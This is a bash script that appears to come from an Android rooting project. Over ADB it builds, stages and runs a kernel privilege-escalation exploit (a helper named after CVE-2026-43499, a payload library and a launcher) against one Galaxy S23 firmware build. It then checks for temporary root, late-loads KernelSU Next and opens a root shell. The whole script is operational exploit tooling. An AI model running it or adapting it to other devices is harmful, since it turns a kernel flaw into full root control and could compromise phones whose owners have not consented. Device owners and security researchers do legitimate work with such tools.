#!/usr/bin/env bash
set -euo pipefail

# simple-root variant for the dm1q (Galaxy S23 / SM-S911U1) DYI3 BOPE port.
# Mirrors simple-root/simple-root.sh end to end for targets/dyi3:
# identity gate, KernelSU Next artifact gate, ELF/BTF contract verification,
# build, staging, stability launcher, KSU Next late-load, root confirmation.

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
ASSET_DIR="$SCRIPT_DIR/assets-dyi3"
ADB="${ADB:-adb}"
REMOTE_HELPER=/data/local/tmp/ksu-helper
REMOTE_PAYLOAD=/data/local/tmp/payload.so
REMOTE_KSUD=/data/local/tmp/ksud-selected
REMOTE_KSUD_STAGE=/data/local/tmp/.ksud-stage
REMOTE_LAUNCHER=/data/local/tmp/stability-launcher
REMOTE_MM_FACTORY=/data/local/tmp/mm-exec-factory
REMOTE_ASSETS=/data/local/tmp/simple-root

usage() {
  printf 'Usage: %s [adb-serial]\n' "${0##*/}"
  printf 'Runs only S911U1UES6DYI3 (Galaxy S23 SM-S911U1, One UI 7) and loads KernelSU Next.\n'
}

if [[ "${1:-}" == -h || "${1:-}" == --help ]]; then
  usage
  exit 0
fi
if [[ $# -gt 1 ]]; then
  usage >&2
  exit 2
fi

# This runner lives at the fork repo root, so the project root is SCRIPT_DIR.
PROJECT_DIR="$SCRIPT_DIR"
TARGET_DIR="$PROJECT_DIR/targets/dyi3"
TARGET_BUILD=S911U1UES6DYI3
TARGET_DESCRIPTION='Galaxy S23 SM-S911U1 One UI 7 firmware'
TARGET_MODEL=SM-S911U1
TARGET_DEVICE=dm1q
TARGET_BUILD_DISPLAY=AP3A.240905.015.A2.S911U1UES6DYI3
TARGET_KERNEL_RELEASE=5.15.153-android13-8-30958972-abS911U1UES6DYI3
TARGET_KERNEL_VERSION='#1 SMP PREEMPT Wed Sep 3 06:21:36 UTC 2025'

if [[ $# -eq 1 ]]; then
  serial="$1"
else
  mapfile -t devices < <("$ADB" devices | awk 'NR > 1 && $2 == "device" { print $1 }')
  if [[ ${#devices[@]} -ne 1 ]]; then
    printf 'Expected exactly one authorized ADB device; found %d.\n' "${#devices[@]}" >&2
    "$ADB" devices -l >&2
    exit 1
  fi
  serial="${devices[0]}"
fi

adb_cmd=("$ADB" -s "$serial")
if ! "${adb_cmd[@]}" get-state 2>/dev/null | grep -qx device; then
  printf 'ADB device is unavailable or unauthorized: %s\n' "$serial" >&2
  exit 1
fi

device_model="$("${adb_cmd[@]}" shell getprop ro.product.model | tr -d '\r')"
device_name="$("${adb_cmd[@]}" shell getprop ro.product.device | tr -d '\r')"
device_build="$("${adb_cmd[@]}" shell getprop ro.build.display.id | tr -d '\r')"
device_kernel_release="$("${adb_cmd[@]}" shell uname -r | tr -d '\r')"
device_kernel_version="$("${adb_cmd[@]}" shell uname -v | tr -d '\r')"
if [[ "$device_model" != "$TARGET_MODEL" ||
      "$device_name" != "$TARGET_DEVICE" ||
      "$device_build" != "$TARGET_BUILD_DISPLAY" ||
      "$device_kernel_release" != "$TARGET_KERNEL_RELEASE" ||
      "$device_kernel_version" != "$TARGET_KERNEL_VERSION" ]]; then
  printf 'Incompatible firmware. simple-root-dyi3 supports only %s (%s).\n' \
    "$TARGET_BUILD" "$TARGET_DESCRIPTION" >&2
  printf 'Expected: %s | %s | %s | %s\n' \
    "$TARGET_MODEL" "$TARGET_DEVICE" "$TARGET_BUILD_DISPLAY" "$TARGET_KERNEL_RELEASE" >&2
  printf 'Detected: %s | %s | %s | %s\n' \
    "$device_model" "$device_name" "$device_build" "$device_kernel_release" >&2
  exit 1
fi
printf '[+] Target confirmed: %s, the %s (%s)\n' \
  "$TARGET_BUILD" "$TARGET_DESCRIPTION" "$serial"

KSUD_DIR="$TARGET_DIR/kernelsu-next/out/kernelsu-next-dyi3-v3.4.0"
KSUD_SOURCE="$KSUD_DIR/ksud-next-v3.4.0"
KSUD_MODULE="$KSUD_DIR/android13-5.15_kernelsu.ko"
KSUD_ASSET=ksud-selected
KSUD_MODULE_ASSET=android13-5.15_kernelsu.ko
if [[ ! -s "$KSUD_SOURCE" || ! -s "$KSUD_MODULE" || ! -s "$KSUD_DIR/SHA256SUMS" ]]; then
  printf 'Samsung-patched KernelSU Next for DYI3 is missing: %s\n' "$KSUD_SOURCE" >&2
  printf 'Build it first: targets/dyi3/kernelsu-next/build-dyi3-v3.4.0.sh\n' >&2
  exit 1
fi
if ! (cd -- "$KSUD_DIR" && sha256sum --status -c SHA256SUMS); then
  printf 'Samsung module and ksud hashes do not match.\n' >&2
  exit 1
fi
if ! grep -a -q 'Samsung KDP task-scoped credential' "$KSUD_MODULE"; then
  printf 'Module does not include Samsung KDP support: %s\n' "$KSUD_MODULE" >&2
  exit 1
fi
if [[ "$(modinfo -F vermagic "$KSUD_MODULE")" != "$TARGET_KERNEL_RELEASE "* ]]; then
  printf 'Module does not match the DYI3 kernel: %s\n' "$KSUD_MODULE" >&2
  exit 1
fi
mkdir -p "$ASSET_DIR"
install -m 755 "$KSUD_SOURCE" "$ASSET_DIR/$KSUD_ASSET"
install -m 644 "$KSUD_MODULE" "$ASSET_DIR/$KSUD_MODULE_ASSET"

ENGINE_DIR="$TARGET_DIR/brazilian-open-payload-engine"
HELPER_DIR="$TARGET_DIR/helper"
HELPER_BINARY="$HELPER_DIR/build/cve-2026-43499-root"
LAUNCHER_BINARY="$ENGINE_DIR/build/stability-launcher-dyi3"
NDK_DIR="${ANDROID_NDK_HOME:-${ANDROID_NDK_ROOT:-$HOME/Android/Sdk/ndk/28.2.13676358}}"
TARGET_CC="$NDK_DIR/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang"
if [[ ! -x "$TARGET_CC" ]]; then
  printf 'Android compiler is missing: %s\nSet ANDROID_NDK_HOME to the installed NDK.\n' "$TARGET_CC" >&2
  exit 1
fi
printf '[*] Verifying the DYI3 ELF/BTF contract\n'
LD_LIBRARY_PATH="$HOME/tools/lib64${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}" \
  PATH="$HOME/tools/bin:$PATH" \
  "$PROJECT_DIR/tools/bope-verify-target" \
  --header "$ENGINE_DIR/src/target.h" \
  --elf "$TARGET_DIR/firmware/vmlinux_DYI3.elf" \
  --btf "$TARGET_DIR/firmware/vmlinux_DYI3.btf"
printf '[*] Building BOPE, the mm factory, and the DYI3 Stability Launcher\n'
make -C "$ENGINE_DIR" -B -j2 "ANDROID_NDK_HOME=$NDK_DIR" so
install -m 755 "$ENGINE_DIR/build/payload.so" "$ASSET_DIR/payload.so"
install -m 755 "$ENGINE_DIR/build/mm-exec-factory" "$ASSET_DIR/mm-exec-factory"
install -m 755 "$LAUNCHER_BINARY" "$ASSET_DIR/stability-launcher"

printf '[*] Building the DYI3 helper from targets/dyi3/helper/su_daemon.c\n'
make -B -C "$HELPER_DIR" "ANDROID_NDK_HOME=$NDK_DIR"
install -m 755 "$HELPER_BINARY" "$ASSET_DIR/ksu-helper"

assets=(ksu-helper payload.so mm-exec-factory "$KSUD_ASSET" "$KSUD_MODULE_ASSET" stability-launcher)
for asset in "${assets[@]}"; do
  [[ -s "$ASSET_DIR/$asset" ]] || {
    printf 'Asset is missing or empty: %s\n' "$ASSET_DIR/$asset" >&2
    exit 1
  }
done

printf '[*] Copying the selected assets to %s\n' "$REMOTE_ASSETS"
"${adb_cmd[@]}" shell mkdir -p "$REMOTE_ASSETS"
for asset in "${assets[@]}"; do
  "${adb_cmd[@]}" push "$ASSET_DIR/$asset" "$REMOTE_ASSETS/$asset"
done

if root_identity="$("${adb_cmd[@]}" shell "/system/bin/su -c 'id'" 2>/dev/null)" &&
   grep -q 'uid=0(root)' <<<"$root_identity"; then
  printf '[+] Root is already active: %s\n' "$root_identity"
  exit 0
fi

stage() {
  local name="$1" target="$2" source magic
  source="$REMOTE_ASSETS/$name"
  "${adb_cmd[@]}" shell rm -f "$target"
  "${adb_cmd[@]}" shell cp "$source" "$target"
  "${adb_cmd[@]}" shell chmod 755 "$target"
  magic="$("${adb_cmd[@]}" shell "head -c 4 '$target' | od -An -tx1 | tr -d ' \\n\\r'")"
  if [[ "$magic" != 7f454c46 ]]; then
    printf 'Invalid ELF magic at %s: %s\n' "$target" "$magic" >&2
    exit 1
  fi
}

printf '[*] Staging the payload on %s\n' "$serial"
stage ksu-helper "$REMOTE_HELPER"
stage payload.so "$REMOTE_PAYLOAD"
stage mm-exec-factory "$REMOTE_MM_FACTORY"
stage stability-launcher "$REMOTE_LAUNCHER"
"${adb_cmd[@]}" shell rm -f /data/local/tmp/ksu-exploit.log

env_exports=""
if [[ -n "${SLIDE_P0_OFFSET:-}" ]]; then
  if [[ ! "$SLIDE_P0_OFFSET" =~ ^0x[0-9a-fA-F]+$ ]]; then
    printf 'Invalid SLIDE_P0_OFFSET; use hexadecimal format 0x...\n' >&2
    exit 2
  fi
  offset_value=$((SLIDE_P0_OFFSET))
  if (( offset_value > 0x1f8000 || (offset_value & 0x7fff) != 0 )); then
    printf 'SLIDE_P0_OFFSET is outside the range/alignment accepted by the app.\n' >&2
    exit 2
  fi
  env_exports+="export SLIDE_P0_OFFSET='$SLIDE_P0_OFFSET'
"
fi
for var in FUTEX_WAIT_SEC KSNITCH_REPEAT KSNITCH_APPENDED PIPE_DETERMINISTIC RMG_TRACE_FILE; do
  val="${!var:-}"
  [[ -z "$val" ]] && continue
  if [[ ! "$val" =~ ^[0-9]+$ ]]; then
    printf 'Invalid %s; use an integer.\n' "$var" >&2
    exit 2
  fi
  env_exports+="export $var='$val'
"
done
# RMG_LOG_VERBOSE gates compact_log's whitelist: without it the payload drops
# every line that is not an error marker or a listed forensic marker, which
# hides the deterministic-path diagnostics entirely.
if [[ "${RMG_LOG_VERBOSE:-}" == 1 ]]; then
  env_exports+="export RMG_LOG_VERBOSE='1'
"
fi
exploit_script="${env_exports}exec '$REMOTE_LAUNCHER' --payload '$REMOTE_PAYLOAD' --helper '$REMOTE_HELPER' --mm-factory '$REMOTE_MM_FACTORY' 2>&1"

printf '[*] Running the payload\n'
exploit_log="$(mktemp)"
trap 'rm -f "$exploit_log"' EXIT
if ! "${adb_cmd[@]}" shell "$exploit_script" 2>&1 | tee "$exploit_log"; then
  printf 'Payload execution failed.\n' >&2
  exit 1
fi
if ! grep -Eq 'temporary-root-ready|exploit completed.*done=1 root=1' "$exploit_log"; then
  printf 'The payload did not confirm temporary root.\n' >&2
  exit 1
fi

stage "$KSUD_ASSET" "$REMOTE_KSUD"
stage "$KSUD_ASSET" "$REMOTE_KSUD_STAGE"
printf '[*] Loading KernelSU Next\n'
if [[ "${RMG_SKIP_LATELOAD:-}" == 1 ]]; then
  printf '[*] RMG_SKIP_LATELOAD=1: keeping temporary root, skipping late-load\n'
  printf '[*] Manual probes: adb shell su -c "..."\n'
  exit 0
fi
if [[ "${RMG_DIAG_CAPTURE:-}" == 1 ]]; then
  printf '[*] Diagnostic capture (temp root active)\n'
  "${adb_cmd[@]}" shell "/data/local/tmp/ksu-helper -c 'dmesg > /data/local/tmp/dmesg-before-lateload.txt; cp /sys/fs/pstore/* /data/local/tmp/ 2>/dev/null; ls -la /sys/fs/pstore/ > /data/local/tmp/pstore-list.txt 2>&1' " || true
  mkdir -p "$ASSET_DIR/diag"
  "${adb_cmd[@]}" pull /data/local/tmp/dmesg-before-lateload.txt "$ASSET_DIR/diag/" || true
  "${adb_cmd[@]}" pull /data/local/tmp/pstore-list.txt "$ASSET_DIR/diag/" || true
  "${adb_cmd[@]}" shell "ls /data/local/tmp/" | grep -E "ramoops|console" | while read -r f; do
    "${adb_cmd[@]}" pull "/data/local/tmp/$f" "$ASSET_DIR/diag/" || true
  done
fi
if ! "${adb_cmd[@]}" shell "$REMOTE_HELPER" --late-load; then
  printf 'KernelSU --late-load failed.\n' >&2
  exit 1
fi
selinux_enforce="$("${adb_cmd[@]}" shell 'cat /sys/fs/selinux/enforce' 2>/dev/null | tr -d '\r\n')"
if [[ "$selinux_enforce" != 1 ]]; then
  printf 'SELinux did not return to enforcing after KernelSU: %s\n' "$selinux_enforce" >&2
  exit 1
fi

printf '[*] Waiting for su (up to 30 seconds)\n'
root_identity=
root_command_ok=0
root_deadline=$((SECONDS + 30))
while :; do
  if root_identity="$("${adb_cmd[@]}" shell "/system/bin/su -c 'id'" 2>/dev/null)"; then
    root_command_ok=1
    if grep -q 'uid=0(root)' <<<"$root_identity"; then
      break
    fi
  fi
  if (( SECONDS >= root_deadline )); then
    break
  fi
  sleep 0.25
done
if ! grep -q 'uid=0(root)' <<<"$root_identity"; then
  if (( root_command_ok == 0 )); then
    printf 'The su -c id command failed after 30 seconds.\n' >&2
  else
    printf 'The su shell did not confirm uid=0(root) after 30 seconds.\n' >&2
  fi
  exit 1
fi
printf '[+] Root confirmed\n'
exec "${adb_cmd[@]}" shell su
